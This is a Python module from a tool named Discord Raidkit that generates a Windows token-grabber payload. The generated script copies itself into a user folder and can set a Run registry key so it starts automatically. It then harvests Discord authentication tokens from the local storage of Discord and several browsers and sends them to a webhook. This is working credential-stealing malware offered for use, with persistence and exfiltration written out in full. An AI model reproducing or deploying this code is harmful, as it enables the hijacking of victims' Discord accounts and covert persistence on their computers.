"""
Discord Raidkit v2.2.1 by the-cult-of-integral
"The trojan horse of discord raiding"
Last updated: 16/06/2022
"""

import json
import os
import re
import requests
from bs4 import BeautifulSoup


def get_latest_release() -> str:
    """Returns the latest release of Discord Raidkit

    Returns:
        str: a.b.c (e.g. 2.0.1)
    """
    headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }
    url = f"\
https://github.com/the-cult-of-integral/discord-raidkit/releases/latest"
    r = requests.get(url, headers=headers)
    soup = str(BeautifulSoup(r.text, 'html.parser'))
    latest_release = re.search(
        r"Release Discord Raidkit v(\d.\d.\d)", soup).group(1)
    return latest_release
        

def do_config_setup(config_path) -> dict:
    """Performs the initial check and setup for Discord Raidkit configuration.

    Args:
        config_path (str): path to configuration JSON file.

    Returns:
        dict: the contents of the configuration JSON file as a dict.
    """
    if os.path.isfile(config_path):
        with open(config_path, "r") as f:
            return json.load(f)
    else:
        temp = {"bot_token": "", "bot_prefix": "", "theme": "dark"}
        with open(config_path, "w") as f:
            json.dump(temp, f, indent=4)
        return temp


def write_config(config_path, token=None, prefix=None, theme=None) -> None:
    temp = do_config_setup(config_path)
    if token:
        temp["bot_token"] = token
    if prefix:
        temp["bot_prefix"] = prefix
    if theme:
        temp["theme"] = theme
    with open(config_path, "w") as f:
        json.dump(temp, f, indent=4)
    return


def get_generate_code(webhook, folder, hpayload, do_reg_key) -> str:
    """Get code to generate token grabber payload.

    Returns:
        str: code to generate token grabber payload.
    
    Credits:
    - wodxgod: created logic to grab discord tokens
    - Microsoft: lets me write to registry keys without administrator
    """

    code = r'''import os
import json
import os
import re
import shutil
import winreg
from urllib.request import Request, urlopen

PAYLOAD_PATH = os.path.realpath(__file__)
WEBHOOK_URL = "''' + webhook + r'''"


def set_autostart_registry(app_name, key_data=None, autostart=True) -> bool:
    with winreg.OpenKey(
        key=winreg.HKEY_CURRENT_USER,
        sub_key=r"Software\Microsoft\Windows\CurrentVersion\Run",
        reserved=0,
        access=winreg.KEY_ALL_ACCESS
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            else:
                winreg.DeleteValue(key, app_name)
        except OSError:
            return False
    return True


def find_tokens(path) -> list:
    path += "\\Local Storage\\leveldb"
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
    
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    
    return tokens


def main():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = "@everyone"

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
    
        message += f"\n**{platform}**\n"

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\n"
        else:
            message += "No tokens found.\n"
        
        message += "\n"
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }

    payload = json.dumps({"content": message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == "__main__":
    path = fr"C:\Users\{os.getenv('username')}''' + f'''\{folder}''' + r'''"
    if not os.path.isdir(path):
        os.mkdir(path)
    file = "''' + hpayload + r'''.pyw"
    try:
        shutil.copy(__file__, f"{path}\{file}")
    except shutil.SameFileError:
        pass
    '''
    if do_reg_key: code += r'''set_autostart_registry("Osiris", f"{path}\{file}")
    '''
    code += r'''main()
'''
    return code


def write_payload(payload, rpayload) -> None:
    """Writes the token grabber payload file
    """
    if not os.path.isdir("payloads"):
        os.mkdir("payloads")
    
    with open(f"payloads/{rpayload}.pyw", "w") as f:
        f.write(payload)
    
    return

